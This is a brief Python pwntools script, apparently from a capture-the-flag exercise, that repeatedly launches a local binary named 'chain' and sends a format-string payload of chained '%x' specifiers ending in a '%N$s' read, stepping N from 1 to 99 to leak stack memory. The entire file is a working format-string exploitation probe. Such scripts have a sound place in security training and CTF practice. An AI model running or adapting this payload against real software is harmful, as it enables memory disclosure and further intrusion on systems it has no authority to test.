from pwn import *

context.log_level = "critical"

for i in range(1, 100):
    io = process('./chain')
    io.sendline("%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%{}$s".format(i).encode())
    print("==============================================")
    print(io.recvrepeat(1).decode(errors="ignore"))
    print("==============================================")
    io.close()
